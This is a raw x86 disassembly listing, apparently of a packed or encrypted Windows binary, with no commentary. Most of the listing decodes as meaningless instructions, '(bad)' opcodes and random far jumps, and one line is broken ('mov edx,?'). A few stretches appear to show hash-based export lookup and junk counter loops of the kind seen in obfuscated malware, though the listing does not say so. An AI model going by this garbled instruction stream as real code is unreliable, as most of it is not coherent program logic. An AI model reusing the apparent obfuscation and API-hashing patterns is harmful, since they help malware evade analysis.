  40497d:	outs   dx,BYTE PTR ds:[esi]
  40497e:	jo     0x404918
  404980:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404981:	xchg   ebx,eax
  404982:	sar    DWORD PTR [edx+0x77812178],0x6a
  404989:	sbb    eax,0xa89e2dc2
  40498e:	and    ebp,DWORD PTR [edx+0x18]
  404991:	xchg   edi,eax
  404992:	sub    eax,0xb7a8b01e
  404997:	fucom  st(4)
  404999:	std    
  40499a:	push   DWORD PTR [eax-0x4462e377]
  4049a0:	int3   
  4049a1:	ins    BYTE PTR es:[edi],dx
  4049a2:	mov    ds:0xa382254c,al
  4049a7:	ins    DWORD PTR es:[edi],dx
  4049a8:	pop    eax
  4049a9:	or     ch,BYTE PTR [edx]
  4049ab:	or     al,0x64
  4049ad:	jbe    0x4049f9
  4049af:	xor    al,0x6c
  4049b1:	add    al,0xea
  4049b3:	mov    al,BYTE PTR [eax+eax*8-0x6b2b2154]
  4049ba:	test   eax,0x96f44e01
  4049bf:	fcom   DWORD PTR ss:[esi-0x65]
  4049c3:	cld    
  4049c4:	xchg   edi,eax
  4049c5:	push   es
  4049c6:	pop    ebp
  4049c7:	or     eax,0x4f257efc
  4049cc:	inc    edi
  4049cd:	shl    BYTE PTR [eax+ecx*2],1
  4049d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049d1:	xor    BYTE PTR [ecx],al
  4049d3:	in     al,dx
  4049d4:	daa    
  4049d5:	js     0x4049b6
  4049d7:	out    0x5d,eax
  4049d9:	retf   0xaa66
  4049dc:	fild   QWORD PTR [esp+edx*2-0x36d4a36c]
  4049e3:	xchg   BYTE PTR [edx-0x77],ch
  4049e6:	mov    ch,cl
  4049e8:	sub    DWORD PTR ds:0xb5488eaa,ecx
  4049ee:	mov    edi,0x518dd97c
  4049f3:	push   es
  4049f4:	loope  0x404996
  4049f6:	(bad)  
  4049f7:	mov    ebx,0xc8aa51f0
  4049fc:	enter  0x9075,0xa1
  404a00:	rcl    DWORD PTR [eax+0x49],1
  404a03:	shl    esi,1
  404a05:	shr    BYTE PTR [edx+ecx*4-0x3c],cl
  404a09:	out    dx,eax
  404a0a:	gs mov edi,0x2fc13388
  404a10:	je     0x4049b5
  404a12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a13:	inc    edx
  404a14:	lahf   
  404a15:	xchg   DWORD PTR [eax+0x58],esp
  404a18:	mov    dh,0xa1
  404a1a:	mov    BYTE PTR [eax],ch
  404a1c:	imul   eax,DWORD PTR [edx+0x1d],0x6e
  404a20:	and    edi,eax
  404a22:	js     0x404a6a
  404a24:	ss push 0x6a
  404a27:	loope  0x4049b3
  404a29:	in     al,0x3
  404a2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a2c:	and    ebx,0xf74e54a7
  404a32:	iret   
  404a33:	dec    esi
  404a34:	scas   al,BYTE PTR es:[edi]
  404a35:	xor    al,0xf6
  404a37:	xchg   ebx,eax
  404a38:	fidiv  WORD PTR [ebp-0xd]
  404a3b:	cmp    edx,ebx
  404a3d:	push   ds
  404a3e:	and    edi,DWORD PTR [ebx-0x22]
  404a41:	push   ds
  404a42:	mov    ecx,0x3b103cd3
  404a47:	mov    bl,0xc3
  404a49:	cli    
  404a4a:	retf   0x3781
  404a4d:	adc    cl,BYTE PTR [esi-0x58]
  404a50:	out    dx,al
  404a51:	fisttp WORD PTR [edi]
  404a53:	(bad)  [edx+0x56]
  404a56:	xor    al,0xa0
  404a58:	pop    ebx
  404a59:	xor    ebp,esp
  404a5b:	mov    WORD PTR [edi-0x1f],gs
  404a5e:	into   
  404a5f:	sahf   
  404a60:	mov    eax,0x7316b184
  404a65:	jge    0x404a54
  404a67:	in     al,0x4a
  404a69:	mov    bl,0x44
  404a6b:	push   0x4ef62713
  404a70:	loop   0x404a1a
  404a72:	(bad)  
  404a73:	mov    ah,0xaa
  404a75:	mov    bl,0xa3
  404a77:	mov    edi,0x1f89724b
  404a7c:	lahf   
  404a7d:	out    0x2e,al
  404a7f:	retf   0x139e
  404a82:	or     ebp,DWORD PTR es:[edx+eiz*8+0x10]
  404a87:	push   edx
  404a88:	jecxz  0x404a0b
  404a8a:	jae    0x404a6b
  404a8c:	jl     0x404ad0
  404a8e:	sub    DWORD PTR [ecx+eax*2],ecx
  404a91:	push   ebp
  404a92:	mov    WORD PTR [esi-0x13],fs
  404a95:	not    BYTE PTR [edx-0x70]
  404a98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a99:	pop    esi
  404a9a:	cli    
  404a9b:	adc    al,0x28
  404a9d:	fucomi st,st(6)
  404a9f:	adc    ebp,DWORD PTR [eax-0x41]
  404aa2:	shl    eax,cl
  404aa4:	cmp    eax,0xbfc743d0
  404aa9:	ret    0xc159
  404aac:	xor    eax,0xdafe61c
  404ab1:	xchg   edx,eax
  404ab2:	fdivr  QWORD PTR [ebx+0x44337647]
  404ab8:	stos   DWORD PTR es:[edi],eax
  404ab9:	inc    esi
  404aba:	jge    0x404a64
  404abc:	idiv   BYTE PTR [edi-0x7401f0d3]
  404ac2:	das    
  404ac3:	mov    edx,0xccf8c13c
  404ac8:	cld    
  404ac9:	in     eax,0x7
  404acb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404acc:	or     edi,0xffffffcd
  404acf:	pop    edx
  404ad0:	xchg   ebp,eax
  404ad1:	sar    esp,1
  404ad3:	test   BYTE PTR [edx+edi*2],dh
  404ad6:	call   0x8e33:0x73e589ed
  404add:	mov    al,ds:0xb9c55d9c
  404ae2:	aaa    
  404ae3:	mov    esi,0x3e1e3bf2
  404ae8:	sahf   
  404ae9:	cld    
  404aea:	shl    BYTE PTR [ebx-0x2bf18c40],0x6e
  404af1:	push   ebp
  404af2:	mov    ss,WORD PTR [ebp-0x3]
  404af5:	(bad)  
  404af6:	xchg   ecx,eax
  404af7:	call   0xc85b:0xf32fe23f
  404afe:	pusha  
  404aff:	mov    ebx,0x8c64b398
  404b04:	ficomp DWORD PTR ss:[eax]
  404b07:	jnp    0x404b02
  404b09:	pop    edi
  404b0a:	cmp    dh,BYTE PTR [edi+0x6f]
  404b0d:	mov    ch,0x92
  404b0f:	in     eax,0x4a
  404b11:	fnstsw WORD PTR [ebp+eiz*8-0xd]
  404b15:	test   ecx,eax
  404b17:	in     eax,dx
  404b18:	ss pop esp
  404b1a:	jecxz  0x404b2d
  404b1c:	pushf  
  404b1d:	pop    edx
  404b1e:	sbb    al,0x95
  404b20:	jmp    0xe08:0x884a174a
  404b27:	shr    BYTE PTR fs:[ebx-0x3],1
  404b2b:	pop    ss
  404b2c:	dec    eax
  404b2d:	fbstp  TBYTE PTR [ecx+ebx*1-0x7765fe0c]
  404b34:	adc    eax,0xc02f11c7
  404b39:	jg     0x404b77
  404b3b:	jl     0x404b01
  404b3d:	jae    0x404bbc
  404b3f:	retf   
  404b40:	add    BYTE PTR [ebp+0x7ad7f868],cl
  404b46:	sub    ebp,DWORD PTR [ebp+0x1d]
  404b49:	push   esp
  404b4a:	jecxz  0x404b85
  404b4c:	push   cs
  404b4d:	cmp    esp,ebx
  404b4f:	stos   DWORD PTR es:[edi],eax
  404b50:	pop    edi
  404b51:	push   ebx
  404b52:	push   cs
  404b53:	inc    esi
  404b54:	test   BYTE PTR [edi-0x75],bh
  404b57:	je     0x404b73
  404b59:	(bad)  
  404b5a:	xlat   BYTE PTR ds:[ebx]
  404b5b:	adc    DWORD PTR [eax+0x2d],ecx
  404b5e:	(bad)  
  404b5f:	loope  0x404bd4
  404b61:	and    ecx,DWORD PTR [esp+ebx*1-0x6e]
  404b65:	in     eax,dx
  404b66:	ret    0xf5de
  404b69:	fstp   TBYTE PTR [edx-0x61]
  404b6c:	pop    eax
  404b6d:	inc    esp
  404b6e:	out    dx,al
  404b6f:	and    eax,0xf86b6c08
  404b74:	dec    ebx
  404b75:	lods   eax,DWORD PTR ds:[esi]
  404b76:	lods   eax,DWORD PTR ds:[esi]
  404b77:	inc    edi
  404b78:	retf   
  404b79:	cmp    al,0xdf
  404b7b:	add    ecx,ebx
  404b7d:	add    BYTE PTR [edx+0x3103e857],bl
  404b83:	cmp    eax,0x97fdffb6
  404b88:	retfw  
  404b8a:	add    DWORD PTR [edx+0x6c1642c2],ebp
  404b90:	fidivr DWORD PTR [edx+0x587eadeb]
  404b96:	fidiv  DWORD PTR [ebx+0x112f6b8e]
  404b9c:	rcr    edi,cl
  404b9e:	xor    DWORD PTR [edi-0x28],eax
  404ba1:	enter  0xc4a0,0xa6
  404ba5:	mov    es,WORD PTR [esi-0x4a]
  404ba8:	push   ds
  404ba9:	pop    eax
  404baa:	lds    ebx,FWORD PTR [edi-0x23]
  404bad:	lahf   
  404bae:	pop    ebx
  404baf:	mov    al,ds:0x55a53704
  404bb4:	imul   ebx,DWORD PTR [esi],0x2f
  404bb7:	add    bl,BYTE PTR gs:[esi]
  404bba:	jns    0x404bc1
  404bbc:	popf   
  404bbd:	pop    edi
  404bbe:	push   eax
  404bbf:	sbb    bh,BYTE PTR [edx]
  404bc1:	inc    ebx
  404bc2:	int3   
  404bc3:	xchg   esp,eax
  404bc4:	xor    esi,eax
  404bc6:	imul   esi,DWORD PTR [eax-0x78],0xfffffff9
  404bca:	(bad)  
  404bcc:	inc    ebx
  404bcd:	mov    cs,WORD PTR [edx-0x6d]
  404bd0:	dec    edi
  404bd1:	aam    0xbd
  404bd3:	out    0xdf,al
  404bd5:	pop    edx
  404bd6:	gs scas eax,DWORD PTR es:[edi]
  404bd8:	jp     0x404beb
  404bda:	cdq    
  404bdb:	mov    ds:0x99c9d8f8,eax
  404be0:	sbb    dh,dl
  404be2:	sti    
  404be3:	(bad)  
  404be4:	push   0x6e1f2262
  404be9:	xlat   BYTE PTR ds:[ebx]
  404bea:	mov    ecx,0x1f6d922c
  404bef:	cmp    eax,0x13f49931
  404bf4:	jmp    0x404bd1
  404bf6:	mov    ah,0xb3
  404bf8:	int3   
  404bf9:	and    esp,ebx
  404bfb:	test   BYTE PTR [ebx],0xd0
  404bfe:	shr    DWORD PTR [ecx],cl
  404c00:	sub    eax,0xd6b6f262
  404c05:	call   0xda71722
  404c0a:	sub    BYTE PTR [esi-0xe],ah
  404c0d:	xchg   esp,eax
  404c0e:	push   ss
  404c0f:	jnp    0x404c02
  404c11:	xor    eax,0xc9c3f0e4
  404c16:	jae    0x404b98
  404c18:	fnstcw WORD PTR [ebp+0x2a9a11c2]
  404c1e:	or     eax,0x723305ff
  404c23:	or     DWORD PTR [ebx-0xa61f8ed],ebp
  404c29:	mov    DWORD PTR [edx],edx
  404c2b:	dec    ecx
  404c2c:	jle    0x404bbd
  404c2e:	mov    ecx,0xaf94229a
  404c33:	or     cl,bl
  404c35:	xchg   ecx,eax
  404c36:	sub    BYTE PTR [eax-0x51],cl
  404c39:	cmp    DWORD PTR [ebp+0x7f2a7d6d],0xffffffb8
  404c40:	push   ebp
  404c41:	inc    esp
  404c42:	sar    ebp,0x2a
  404c45:	inc    edi
  404c46:	outs   dx,BYTE PTR ds:[esi]
  404c47:	pop    ebx
  404c48:	and    edi,eax
  404c4a:	push   ebx
  404c4b:	in     eax,dx
  404c4c:	jge    0x404cbc
  404c4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c4f:	mov    ebx,0x8bc64cd9
  404c54:	popf   
  404c55:	xor    cl,BYTE PTR [ecx-0x58]
  404c58:	add    al,0xde
  404c5a:	jg     0x404bf2
  404c5c:	ja     0x404c76
  404c5e:	mov    DWORD PTR [esp+ebx*2+0x76],ecx
  404c62:	ret    
  404c63:	out    dx,al
  404c64:	pushf  
  404c65:	xchg   ebp,eax
  404c66:	sbb    al,0x61
  404c68:	jbe    0x404c29
  404c6a:	jp     0x404c74
  404c6c:	sub    eax,0xfd7c729f
  404c71:	sub    DWORD PTR [ebp+0x54],0x9bbbfc5c
  404c78:	cmp    edi,esi
  404c7a:	jno    0x404ca8
  404c7c:	push   cs
  404c7d:	je     0x404c69
  404c7f:	fstp   QWORD PTR ds:0x6e5c2aa4
  404c85:	in     al,dx
  404c86:	push   edx
  404c87:	xor    BYTE PTR [ebp-0x1cb04862],ah
  404c8d:	mov    BYTE PTR [ebp+0x75f81e13],ch
  404c93:	dec    edi
  404c94:	xchg   edx,eax
  404c95:	mov    esp,0x6bde2edb
  404c9a:	pop    esp
  404c9b:	mov    ah,BYTE PTR [ecx-0x64baf7b8]
  404ca1:	xor    al,0x5c
  404ca3:	(bad)  
  404ca5:	ins    DWORD PTR es:[edi],dx
  404ca6:	out    dx,al
  404ca7:	cld    
  404ca8:	pushf  
  404ca9:	inc    ecx
  404caa:	loope  0x404cff
  404cac:	pushf  
  404cad:	and    cl,dh
  404caf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cb0:	xchg   ebx,eax
  404cb1:	xor    DWORD PTR [ebx],esi
  404cb3:	aam    0x12
  404cb5:	ins    BYTE PTR es:[edi],dx
  404cb6:	sbb    eax,0x61bdea04
  404cbb:	mov    dh,0xc9
  404cbd:	xor    DWORD PTR [eax-0x3025d0bd],0xffffffb3
  404cc4:	fsubr  st(7),st
  404cc6:	push   ecx
  404cc7:	dec    DWORD PTR [edi+0x3d61edfe]
  404ccd:	mov    esi,0xd9b7c5d5
  404cd2:	push   ds
  404cd3:	scas   al,BYTE PTR es:[edi]
  404cd4:	adc    DWORD PTR [edx-0x615672d7],esp
  404cda:	in     al,dx
  404cdb:	and    DWORD PTR [edx],eax
  404cdd:	pop    ss
  404cde:	jmp    0xbe09851
  404ce3:	inc    edx
  404ce4:	jmp    0x404cbd
  404ce6:	ins    DWORD PTR es:[edi],dx
  404ce7:	sub    edi,DWORD PTR [ecx]
  404ce9:	or     al,0xa8
  404ceb:	fwait
  404cec:	ret    
  404ced:	push   eax
  404cee:	mov    ebp,0x9528d841
  404cf3:	mov    esp,0xd074e97c
  404cf8:	enter  0xa9c8,0xf5
  404cfc:	xor    BYTE PTR [ebx+0x81ec45],cl
  404d02:	mov    edx,?
  404d04:	add    eax,0xf0458b07
  404d09:	mov    edx,DWORD PTR [ebp+0x8]
  404d0c:	xor    eax,ecx
  404d0e:	lea    eax,[eax+edx*1+0x327299]
  404d15:	mov    DWORD PTR [ebp+0x8],eax
  404d18:	inc    DWORD PTR [ebp+0xc]
  404d1b:	jmp    0x4040d8
  404d20:	mov    eax,DWORD PTR [ebp-0x10]
  404d23:	xor    eax,ecx
  404d25:	mov    ecx,DWORD PTR [ebp+0x10]
  404d28:	add    eax,esi
  404d2a:	mov    DWORD PTR [ecx],eax
  404d2c:	pop    esi
  404d2d:	leave  
  404d2e:	ret    0xc
  404d31:	push   ebp
  404d32:	mov    ebp,esp
  404d34:	push   ecx
  404d35:	sub    edx,eax
  404d37:	jmp    0x404f34
  404d3c:	pop    edi
  404d3d:	mov    ebx,cs
  404d3f:	and    ebp,edi
  404d41:	jno    0x404dc0
  404d43:	dec    esp
  404d44:	call   0x5caa7d7b
  404d49:	push   ss
  404d4a:	cdq    
  404d4b:	cmp    eax,0x7e7e2f1b
  404d50:	pop    esi
  404d51:	jg     0x404dd1
  404d53:	jle    0x404d56
  404d55:	jbe    0x404d3b
  404d57:	inc    BYTE PTR [eax]
  404d59:	(bad)  
  404d5b:	jp     0x404d77
  404d5d:	ds ins DWORD PTR es:[edi],dx
  404d5f:	and    dl,BYTE PTR [esp+edx*2]
  404d62:	das    
  404d63:	les    edx,FWORD PTR [eax-0x76]
  404d66:	push   eax
  404d67:	loop   0x404d19
  404d69:	mov    ah,0x53
  404d6b:	sbb    esi,DWORD PTR [ecx]
  404d6d:	dec    edx
  404d6e:	adc    BYTE PTR [ecx-0xc],dl
  404d71:	mov    ds:0xaf0f544a,al
  404d76:	mov    ebx,0xb914071f
  404d7b:	add    ebx,DWORD PTR [ecx]
  404d7d:	test   bh,bl
  404d7f:	std    
  404d80:	xchg   DWORD PTR [eax-0x38],ebp
  404d83:	or     eax,0xa69987f3
  404d88:	sub    BYTE PTR [edx-0x18],al
  404d8b:	cmp    DWORD PTR [eax],esi
  404d8d:	pop    esp
  404d8e:	pop    es
  404d8f:	jno    0x404d17
  404d91:	mov    ch,0xfb
  404d93:	out    0xb8,al
  404d95:	or     BYTE PTR es:[ebp+0x6e],dl
  404d99:	jo     0x404d31
  404d9b:	jbe    0x404d95
  404d9d:	test   eax,0x1a72dc30
  404da2:	ds popf 
  404da4:	mov    BYTE PTR [eax],0xe7
  404da7:	mov    al,ds:0x378538f5
  404dac:	es cld 
  404dae:	xor    BYTE PTR [edx-0x5ca2e665],ch
  404db4:	jmp    0xab0b:0xbac69553
  404dbb:	imul   ecx,DWORD PTR [eax-0x5de3c3e1],0xa9e544f7
  404dc5:	call   FWORD PTR [ebp-0x2d]
  404dc8:	loopne 0x404dee
  404dca:	jo     0x404d6d
  404dcc:	and    BYTE PTR [eax],0xf5
  404dcf:	fs pop edi
  404dd1:	into   
  404dd2:	cwde   
  404dd3:	sub    ebp,ecx
  404dd5:	xchg   ecx,eax
  404dd6:	bound  edi,QWORD PTR [ebx]
  404dd8:	inc    ebp
  404dd9:	rol    DWORD PTR [edx],0xa1
  404ddc:	lea    esi,[esi-0x4dbaa321]
  404de2:	mov    ebp,0x1cc0c2d
  404de7:	(bad)  
  404de8:	xor    esp,DWORD PTR [ebp+ecx*4+0x1a]
  404dec:	mov    ah,0xa7
  404dee:	inc    ebx
  404def:	rcr    BYTE PTR ds:0xe9db655f,0xae
  404df6:	mov    al,ds:0x6c76782b
  404dfb:	add    DWORD PTR [esi+esi*4+0x43f72ec5],0x29
  404e03:	mov    edx,0x1cf163a5
  404e08:	sub    eax,0x9549cf6c
  404e0d:	and    eax,DWORD PTR [eax]
  404e0f:	aad    0xe7
  404e11:	mov    edx,0x43ff8e80
  404e16:	sti    
  404e17:	clc    
  404e18:	fild   DWORD PTR [esi+0x25]
  404e1b:	sub    BYTE PTR [esi-0xeb717c5],bh
  404e21:	mov    al,ds:0x7bc5456c
  404e26:	and    BYTE PTR [ecx],cl
  404e28:	jecxz  0x404e36
  404e2a:	xor    ebp,ebx
  404e2c:	mov    ch,0x37
  404e2e:	mov    al,ds:0x675c995b
  404e33:	out    dx,eax
  404e34:	xchg   esi,eax
  404e35:	mov    esp,0xa6648fc3
  404e3a:	and    BYTE PTR [ebx],cl
  404e3c:	or     bh,dl
  404e3e:	(bad)  
  404e3f:	sar    DWORD PTR [edi],0x86
  404e42:	xchg   ebx,eax
  404e43:	dec    ebp
  404e44:	xchg   ebp,eax
  404e45:	stc    
  404e46:	mov    edi,DWORD PTR [edi-0x182126d2]
  404e4c:	cmp    BYTE PTR [esi],dl
  404e4e:	mov    ebx,0xe14e7e24
  404e53:	loope  0x404ed4
  404e55:	lock sub DWORD PTR [ecx+ebp*1],edi
  404e59:	call   0xe941:0x9205f15e
  404e60:	sbb    bl,ch
  404e62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e63:	and    eax,0xd42cae79
  404e68:	sbb    eax,0x208065a0
  404e6d:	adc    BYTE PTR [eax+eiz*8+0x2a],dh
  404e71:	mov    ds:0x8b897e7f,eax
  404e76:	inc    ecx
  404e77:	aam    0xa6
  404e79:	and    BYTE PTR [esi],al
  404e7b:	imul   edx,DWORD PTR [eax+0xe18000b],0xcd24a08b
  404e85:	lea    eax,[esi]
  404e87:	mov    esp,0x3681fe59
  404e8c:	sub    BYTE PTR [edi-0x855dd36],ch
  404e92:	aam    0x5
  404e94:	(bad)  
  404e95:	neg    BYTE PTR [ebx]
  404e97:	jno    0x404eb7
  404e99:	and    DWORD PTR [ebx-0x68647f14],ebp
  404e9f:	(bad)  
  404ea0:	and    ecx,edx
  404ea2:	std    
  404ea3:	or     BYTE PTR [ebp+ebp*2-0x2e2dbf8b],ch
  404eaa:	shl    BYTE PTR [edx-0xa],1
  404ead:	imul   edi,DWORD PTR ds:0x62c3673,0xffffffce
  404eb4:	jecxz  0x404e76
  404eb6:	retf   
  404eb7:	mov    cl,0x25
  404eb9:	(bad)  
  404ebb:	xor    esp,DWORD PTR [esi-0x78374adb]
  404ec1:	ins    BYTE PTR es:[edi],dx
  404ec2:	test   DWORD PTR [edi],0x43448399
  404ec8:	push   cs
  404ec9:	sbb    ch,BYTE PTR [ebx+edi*2+0x7]
  404ecd:	jno    0x404f14
  404ecf:	ins    DWORD PTR es:[edi],dx
  404ed0:	cmp    al,0x54
  404ed2:	retf   
  404ed3:	lahf   
  404ed4:	push   edi
  404ed5:	xchg   BYTE PTR [esi],bl
  404ed7:	sbb    al,0xc
  404ed9:	xor    edi,0x2e5b4c74
  404edf:	rcr    BYTE PTR ss:[ebx+0x4a],cl
  404ee3:	test   dl,0x59
  404ee6:	call   0xf91f:0x6447c166
  404eed:	mov    esi,0x8af040eb
  404ef2:	mov    edx,0x46bc6bb9
  404ef7:	jp     0x404ea0
  404ef9:	sbb    ah,dl
  404efb:	cmp    DWORD PTR [ebx],0xc86d3a1c
  404f01:	fldcw  WORD PTR [ebx]
  404f03:	repnz add dl,BYTE PTR ds:0xfa74618c
  404f0a:	mov    esp,0x3e94fed1
  404f0f:	jmp    0xf0441408
  404f14:	dec    ecx
  404f15:	jo     0x404f3b
  404f17:	repz xor al,0x81
  404f1a:	or     BYTE PTR [edi+edi*4+0x2f9a79c5],bh
  404f21:	cwde   
  404f22:	mov    esi,0xaa36f8b8
  404f27:	shr    DWORD PTR [ecx+0x187f1cc6],0x2b
  404f2e:	in     eax,0x30
  404f30:	(bad)  
  404f31:	ins    DWORD PTR es:[edi],dx
  404f32:	and    DWORD PTR [esi],0x7b150b51
  404f38:	inc    esp
  404f39:	inc    ebx
  404f3a:	add    bh,al
  404f3c:	inc    ebp
  404f3d:	clc    
  404f3e:	test   DWORD PTR ss:[eax+edi*8+0x450b05c7],ebx
  404f46:	inc    ebx
  404f47:	add    BYTE PTR [eax+eax*1],bl
  404f4a:	add    BYTE PTR [eax],al
  404f4c:	cmp    DWORD PTR ds:0x43450b,0x0
  404f53:	je     0x404f94
  404f59:	cmp    DWORD PTR ds:0x43450b,0x21
  404f60:	jne    0x404f84
  404f66:	push   DWORD PTR [ebp-0x24]
  404f69:	push   DWORD PTR [ebp-0x20]
  404f6c:	push   0x26f9
  404f71:	push   0x3d74
  404f76:	push   0x4b4e
  404f7b:	push   DWORD PTR [ebp-0x1c]
  404f7e:	call   DWORD PTR ds:0x413280
  404f84:	mov    eax,ds:0x43450b
  404f89:	dec    eax
  404f8a:	mov    ds:0x43450b,eax
  404f8f:	jmp    0x404f4c
  404f94:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  404f9b:	mov    eax,DWORD PTR [ebp-0x4]
  404f9e:	xor    DWORD PTR ds:0x434473,ecx
  404fa4:	push   esi
  404fa5:	and    DWORD PTR ds:0x434513,0x0
  404faf:	mov    edx,DWORD PTR ds:0x434513
  404fb5:	inc    edx
  404fb6:	mov    DWORD PTR ds:0x434513,edx
  404fbc:	cmp    DWORD PTR ds:0x434513,0x21
  404fc3:	jne    0x404fe1
  404fc9:	push   0x4346c9
  404fce:	push   0x43464e
  404fd3:	push   0x6321
  404fd8:	push   DWORD PTR [ebp-0x10]
  404fdb:	call   DWORD PTR ds:0x4130bc
  404fe1:	cmp    DWORD PTR ds:0x434513,0x19
  404fe8:	jb     0x404faf
  404fee:	inc    ecx
  404fef:	mov    esi,DWORD PTR [ebp-0x8]
  404ff2:	inc    DWORD PTR ds:0x4344b7
  404ff8:	mov    edx,0x7510851
  404ffd:	xor    eax,edx
  404fff:	xor    esi,edx
  405001:	mov    ecx,0x327299
  405006:	add    esi,ecx
  405008:	xor    DWORD PTR ds:0x4344b7,0x55d1
  405012:	add    eax,ecx
  405014:	imul   eax,esi
  405017:	mov    esi,DWORD PTR [ebp+0xc]
  40501a:	cmp    esi,eax
  40501c:	jne    0x405038
  405022:	mov    eax,DWORD PTR [ebp-0x4]
  405025:	mov    esi,DWORD PTR [ebp-0x8]
  405028:	xor    eax,edx
  40502a:	xor    esi,edx
  40502c:	add    eax,ecx
  40502e:	add    esi,ecx
  405030:	imul   eax,esi
  405033:	jmp    0x405270
  405038:	mov    eax,DWORD PTR [ebp+0xc]
  40503b:	mov    eax,DWORD PTR [eax+0x78]
  40503e:	jmp    0x40523b
  405043:	imul   esp,DWORD PTR [eax],0x7d571dbe
  405049:	jge    0x4050b7
  40504b:	push   esp
  40504c:	pop    ds
  40504d:	loopne 0x40508f
  40504f:	jle    0x405028
  405051:	leave  
  405052:	xchg   ebx,eax
  405053:	jnp    0x40507e
  405055:	jle    0x4050d5
  405057:	pop    esi
  405058:	jg     0x4050d8
  40505a:	jle    0x405084
  40505c:	and    DWORD PTR [edi+0x49],esi
  40505f:	int3   
  405060:	mov    ecx,0xf3809896
  405065:	and    al,0xaa
  405067:	popf   
  405068:	cli    
  405069:	ss jecxz 0x40509f
  40506c:	test   eax,0x344185e5
  405071:	div    eax
  405073:	popa   
  405074:	push   ds
  405075:	push   edi
  405076:	push   edi
  405077:	icebp  
  405078:	jle    0x4050a6
  40507a:	cmp    eax,0xf1154510
  40507f:	syscall 
  405081:	aaa    
  405082:	daa    
  405083:	loope  0x405060
  405085:	inc    ebx
  405086:	cmp    edx,ebx
  405088:	retf   
  405089:	(bad)  
  40508b:	or     ah,bh
  40508d:	xor    DWORD PTR [eax+esi*2+0xb],esi
  405091:	mov    ecx,0x2adc7777
  405096:	add    eax,0xbc44bf67
  40509b:	push   edx
  40509c:	aas    
  40509d:	ins    BYTE PTR es:[edi],dx
  40509e:	adc    bh,al
  4050a0:	arpl   WORD PTR [ebp-0x4e],dx
  4050a3:	data16 jecxz 0x4050ed
  4050a6:	cwde   
  4050a7:	and    DWORD PTR [edi+0x12],0x62
  4050ab:	inc    eax
  4050ac:	gs sti 
  4050ae:	jbe    0x405100
  4050b0:	aam    0x52
  4050b2:	mov    ecx,DWORD PTR [ebp-0x5c33c8b5]
  4050b8:	mov    bh,0xa0
  4050ba:	mov    bl,0x8
  4050bc:	pop    ss
  4050bd:	int    0x24
  4050bf:	pop    eax
  4050c0:	fisttp QWORD PTR [edx-0x3aa622f4]
  4050c6:	scas   al,BYTE PTR es:[edi]
  4050c7:	push   esp
  4050c8:	and    al,0xac
  4050ca:	push   cs
  4050cb:	enter  0xeb8d,0x3f
  4050cf:	aam    0xe6
  4050d1:	in     eax,dx
  4050d2:	ret    0xa297
  4050d5:	sub    eax,0x25dfd339
  4050da:	jne    0x405085
  4050dc:	pop    es
  4050dd:	add    ch,ah
  4050df:	xchg   esi,eax
  4050e0:	xchg   esi,eax
  4050e1:	sbb    al,0x6a
  4050e3:	loopne 0x405119
  4050e5:	add    cl,BYTE PTR [edi+0x23]
  4050e8:	loop   0x40510e
  4050ea:	stc    
  4050eb:	enter  0xe4ea,0xf0
  4050ef:	cmp    al,0xc9
  4050f1:	lock repz scas eax,DWORD PTR es:[edi]
  4050f4:	outs   dx,DWORD PTR ds:[esi]
  4050f5:	xchg   ebp,eax
  4050f6:	xor    eax,0x7e841d79
  4050fb:	sahf   
  4050fc:	mov    bl,BYTE PTR ds:0x138fb980
  405102:	or     al,0x78
  405104:	popa   
  405105:	add    dh,BYTE PTR [ebx]
  405107:	fwait
  405108:	stos   BYTE PTR es:[edi],al
  405109:	gs (bad) 
  40510b:	ins    BYTE PTR es:[edi],dx
  40510c:	outs   dx,DWORD PTR ds:[esi]
  40510d:	xchg   ecx,eax
  40510e:	ss mov edx,0x17dc33d3
  405114:	outs   dx,BYTE PTR ds:[esi]
  405115:	loopne 0x405122
  405117:	mov    ds:0x7b756532,al
  40511c:	push   eax
  40511d:	fwait
  40511e:	push   0x73
  405120:	stos   BYTE PTR es:[edi],al
  405121:	jl     0x40514b
  405123:	pop    eax
  405124:	mov    ebx,0x78cb2a48
  405129:	std    
  40512a:	fbstp  TBYTE PTR [edx-0x42]
  40512d:	loopne 0x405198
  40512f:	call   0x766c0985
  405134:	test   eax,0x9ef149f
  405139:	dec    edx
  40513a:	ficomp DWORD PTR [ebx+0x4505d4df]
  405140:	pusha  
  405141:	mov    BYTE PTR [ebx],dl
  405143:	(bad)  
  405144:	adc    eax,0x507680e4
  405149:	inc    ecx
  40514a:	sar    bl,0xc8
  40514d:	mov    ecx,DWORD PTR [esi+0x4]
  405150:	mov    al,ds:0x3fa5a69d
  405155:	xchg   ecx,eax
  405156:	sbb    al,0x7a
  405158:	repnz stos BYTE PTR es:[edi],al
  40515a:	loopne 0x405185
  40515c:	out    dx,al
  40515d:	jns    0x4051b8
  40515f:	and    DWORD PTR [edi-0x3f9054fb],esi
  405165:	add    edx,esp
  405167:	mov    bh,0x3e
  405169:	jnp    0x4051a0
  40516b:	mov    edi,0x36dacd9
  405170:	fisttp QWORD PTR [edx]
  405172:	mov    edx,0xc56f3fc9
  405177:	lds    esi,FWORD PTR [eax]
  405179:	lods   eax,DWORD PTR ds:[esi]
  40517a:	mov    ds:0x2244f8a8,al
  40517f:	imul   ebp,DWORD PTR [ebp-0x628370a0],0xfffffff4
  405186:	push   ebx
  405187:	daa    
  405188:	(bad)  
  405189:	xlat   BYTE PTR ds:[ebx]
  40518a:	jb     0x4051e6
  40518c:	mov    ch,0x37
  40518e:	les    ebp,FWORD PTR [ebp+0x18893ecd]
  405194:	xchg   ebp,eax
  405195:	popf   
  405196:	and    al,0xb
  405198:	add    al,0xee
  40519a:	xchg   bl,bl
  40519c:	jmp    0xfbd70677
  4051a1:	xchg   ebp,eax
  4051a2:	xchg   ebp,eax
  4051a3:	iret   
  4051a4:	push   cs
  4051a5:	mov    eax,0x512360dd
  4051aa:	cli    
  4051ab:	xchg   esi,eax
  4051ac:	mov    ah,0x77
